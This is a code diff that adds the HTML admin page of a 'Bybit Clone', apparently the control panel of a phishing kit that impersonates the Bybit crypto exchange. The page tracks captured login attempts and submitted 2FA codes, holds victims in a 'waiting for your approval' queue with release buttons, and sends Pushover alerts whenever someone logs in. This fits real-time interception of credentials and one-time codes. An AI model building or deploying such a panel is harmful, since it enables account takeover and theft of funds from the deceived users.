@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard | Bybit Clone</title>
+  <!-- Site icon (favicon) -->
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="icon" type="image/png" sizes="any" href="assets/img/bybit-seeklogo.png">
+  <link rel="apple-touch-icon" href="assets/img/bybit-seeklogo.png">
+  <meta name="theme-color" content="#0b0e11">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="stylesheet" href="assets/css/styles.css">
+</head>
+
+<body>
+
+  <header class="adm-hdr">
+    <div class="adm-hdr-in">
+      <img class="adm-logo" src="assets/img/auth-lightlogo.png" alt="BYBIT">
+      <h1>Admin Dashboard</h1>
+      <span class="adm-live" id="admLive" hidden><i></i>Live</span>
+      <div class="adm-hdr-r">
+        <span class="adm-hdr-email" id="admHdrEmail"></span>
+        <button class="adm-hbtn" id="admSound" type="button">🔔 Sound on</button>
+        <button class="adm-hbtn" id="admNotify" type="button" hidden>Enable desktop alerts</button>
+        <button class="adm-hbtn" id="admOut" type="button" hidden>Sign out</button>
+      </div>
+    </div>
+  </header>
+
+  <main class="adm-main">
+
+    <!-- Shown when not signed in -->
+    <div class="adm-auth" id="admAuth">
+      <h1>Open the dashboard</h1>
+      <p class="vf-hint" style="margin-top:6px">Restricted to the admin account only.</p>
+      <input class="auth-input" id="admEmail" type="email" placeholder="Email" aria-label="Email" autocomplete="email">
+      <input class="auth-input" id="admPass" type="password" placeholder="Password" aria-label="Password"
+        autocomplete="current-password">
+      <div class="auth-err" id="admErr" role="alert"></div>
+      <button class="auth-btn" id="admBtn" type="button">Sign In</button>
+    </div>
+
+    <!-- Shown when a signed-in user is not the admin -->
+    <div class="adm-denied" id="admDenied" hidden>
+      <h1>Not authorized</h1>
+      <p>This account does not have access to the dashboard. Only the admin account can view login notifications and
+        release users.</p>
+      <button class="adm-act" id="admDeniedOut" type="button" style="margin-top:16px">Sign out</button>
+      <p class="adm-uid" id="admDeniedWhy"></p>
+    </div>
+
+    <!-- Dashboard -->
+    <div class="adm-wrap" id="admDash" hidden>
+      <div class="adm-dberr" id="admDbErr" hidden></div>
+      <div class="adm-stats">
+        <div class="adm-tile">
+          <div class="adm-tile-l">Waiting for your approval</div>
+          <div class="adm-tile-v warn" id="statWaiting">0</div>
+        </div>
+        <div class="adm-tile">
+          <div class="adm-tile-l">Login attempts seen (this session)</div>
+          <div class="adm-tile-v" id="statLogins">0</div>
+        </div>
+        <div class="adm-tile">
+          <div class="adm-tile-l">2FA codes submitted (this session)</div>
+          <div class="adm-tile-v" id="statOtp">0</div>
+        </div>
+      </div>
+
+      <section class="adm-sec">
+        <div class="adm-sec-h">
+          <h2>Pushover Settings</h2>
+        </div>
+        <div style="padding: 16px; display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
+          <div style="flex: 1; min-width: 240px;">
+            <label style="display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 6px;">Pushover
+              User Key / Token</label>
+            <input class="auth-input" id="admPushoverKey" type="text" placeholder="Enter your Pushover user/group key"
+              style="margin: 0; font-size: 13px; height: 38px;">
+          </div>
+          <div style="flex: 1; min-width: 240px;">
+            <label style="display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 6px;">Pushover
+              API App Token (required — from pushover.net/apps)</label>
+            <input class="auth-input" id="admPushoverAppToken" type="text"
+              placeholder="App Token" style="margin: 0; font-size: 13px; height: 38px;">
+          </div>
+          <div>
+            <button class="adm-act primary" id="savePushover" type="button"
+              style="margin-top: 18px; height: 38px; padding: 0 16px;">Save Keys</button>
+            <button class="adm-act" id="testPushover" type="button"
+              style="margin-top: 18px; height: 38px; padding: 0 16px; margin-left: 8px;">Send test</button>
+          </div>
+          <div style="flex-basis: 100%;">
+            <span id="pushoverStatus" style="font-size: 13px; line-height: 1.5;" hidden></span>
+            <span id="pushoverSaveStatus" style="font-size: 13px; color: #22c55e; margin-left: 10px;" hidden>Saved
+              ✓</span>
+          </div>
+        </div>
+      </section>
+
+      <section class="adm-sec">
+        <div class="adm-sec-h">
+          <h2>Waiting for your approval</h2>
+          <span class="adm-count zero" id="waitCount">0</span>
+          <div class="adm-sec-act">
+            <button class="adm-act primary" id="relAll" type="button">Release all</button>
+            <button class="adm-act" id="clearWaits" type="button">Clear list</button>
+          </div>
+        </div>
+        <div id="admWaits"></div>
+        <div class="adm-empty" id="waitsEmpty">Nobody is waiting. Users appear here the moment they submit their login.
+        </div>
+      </section>
+
+      <section class="adm-sec">
+        <div class="adm-sec-h">
+          <h2>Login notifications</h2>
+          <div class="adm-sec-act">
+            <button class="adm-act" id="clearEvents" type="button">Clear feed</button>
+          </div>
+        </div>
+        <div id="admEvents"></div>
+        <div class="adm-empty" id="eventsEmpty">No notifications yet — you’ll get them here instantly when someone logs
+          in.</div>
+      </section>
+    </div>
+
+  </main>
+
+  <div class="toast-wrap" id="admToasts"></div>
+
+  <script src="assets/js/firebase/firebase-app-compat.js"></script>
+  <script src="assets/js/firebase/firebase-auth-compat.js"></script>
+  <script src="assets/js/firebase/firebase-database-compat.js"></script>
+  <script src="assets/js/firebase/firebase-init.js?v=6"></script>
+  <script src="assets/js/admin.js?v=9"></script>
+</body>
+
+</html>
